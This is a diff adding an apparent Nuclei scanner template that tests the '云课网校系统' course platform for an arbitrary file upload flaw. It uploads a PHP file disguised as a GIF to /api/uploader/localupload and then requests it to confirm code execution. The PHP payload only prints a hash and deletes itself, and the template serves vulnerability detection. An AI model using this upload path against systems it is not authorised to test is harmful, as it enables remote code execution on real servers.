@@ -1,0 +1,58 @@
+id: poc-yaml-yunknet-localupload-anyfile-upload
+info:
+  name: 云课网校系统 localupload 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    云课网校系统存在任意文件上传漏洞，通过上传包含恶意代码的文件可以实现远程代码执行。
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/api/uploader/localupload"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+      Content-Type: image/gif
+
+      <?php echo md5({{t1}});unlink(__FILE__);?>
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"success\":true"
+          - ".php"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/video/0/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
